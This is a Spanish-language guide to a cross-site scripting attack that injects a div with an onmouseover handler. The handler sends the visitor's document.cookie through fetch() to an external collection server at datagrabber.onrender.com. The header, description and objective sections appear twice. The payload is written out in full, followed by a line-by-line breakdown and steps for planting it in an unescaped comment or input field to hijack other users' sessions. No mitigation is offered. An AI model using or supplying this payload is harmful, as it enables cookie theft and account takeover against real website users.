### Documentación para inyección de código JavaScript usando `onmouseover`

#### Descripción:

Este documento describe cómo realizar una inyección de código JavaScript mediante el evento `onmouseover` en una página web vulnerable. El objetivo es interceptar y enviar cookies del usuario a un servidor externo cuando el usuario pase el ratón sobre un elemento HTML.

#### Objetivo:

El objetivo de esta técnica es aprovechar una vulnerabilidad de **Cross-Site Scripting (XSS)** para robar cookies o información sensible del usuario. Esta información puede ser enviada a un servidor controlado por el atacante para su posterior uso, como la suplantación de identidad o el secuestro de sesiones.

#### Código para la inyección:

```javascript
<div onmouseover="fetch('https://datagrabber.onrender.com/grab?data=' + encodeURIComponent(document.cookie))">
    Pasa el ratón por aquí
</div>

```
### Documentación para inyección de código JavaScript usando `onmouseover`

#### Descripción:

Este documento describe cómo realizar una inyección de código JavaScript mediante el evento `onmouseover` en una página web vulnerable. El objetivo es interceptar y enviar cookies del usuario a un servidor externo cuando el usuario pase el ratón sobre un elemento HTML.

#### Objetivo:

El objetivo de esta técnica es aprovechar una vulnerabilidad de **Cross-Site Scripting (XSS)** para robar cookies o información sensible del usuario. Esta información puede ser enviada a un servidor controlado por el atacante para su posterior uso, como la suplantación de identidad o el secuestro de sesiones.

#### Código para la inyección:

```bash
`<div onmouseover="fetch('https://datagrabber.onrender.com/grab?data=' + encodeURIComponent(document.cookie))">     Pasa el ratón por aquí </div>`
```

#### Desglose del código:

1. **Elemento interactivo (`<div>`)**: El código inyecta un `<div>` en la página web que ejecutará JavaScript cuando el usuario pase el ratón por encima.
    
2. **Evento `onmouseover`**: El atributo `onmouseover` se activa cuando el usuario pasa el ratón sobre el área del elemento `<div>`. Este evento puede ejecutarse en diferentes elementos como `<img>`, `<a>`, `<button>`, entre otros.
    
3. **`fetch()`**: Se realiza una solicitud HTTP utilizando la función `fetch()`. Esta función envía una petición GET al servidor externo con las cookies del documento (obtenidas a través de `document.cookie`).
    
4. **`encodeURIComponent(document.cookie)`**: La función `encodeURIComponent()` se usa para codificar las cookies del usuario de manera segura para ser enviadas a través de la URL. Esto evita problemas con caracteres especiales en las cookies que podrían romper la URL.
    
5. **URL maliciosa**: En este caso, la información sensible (las cookies) se envía a `https://datagrabber.onrender.com/grab`, un servidor controlado por el atacante. El servidor podría registrar las cookies y utilizarlas para llevar a cabo ataques adicionales, como el secuestro de sesiones.
    

#### Ejecución:

1. El atacante encuentra una página web vulnerable que no valida o escapa adecuadamente el código introducido por el usuario (por ejemplo, comentarios o campos de texto).
    
2. El atacante inyecta el código anterior en un campo de entrada de usuario que se renderiza directamente como HTML en la página web.
    
3. Cuando un usuario pasa el ratón sobre el elemento inyectado (en este caso, el `<div>`), el navegador ejecuta el código `onmouseover`, lo que envía una solicitud HTTP con las cookies del usuario al servidor externo.
    

#### Ejemplo de escenario:

Un atacante puede aprovecharse de un foro o sección de comentarios donde los datos introducidos por los usuarios no se validan adecuadamente. Si el atacante inyecta el código descrito en el campo de comentarios, cualquier otro usuario que pase el ratón por encima del comentario verá que sus cookies se envían al servidor del atacante.
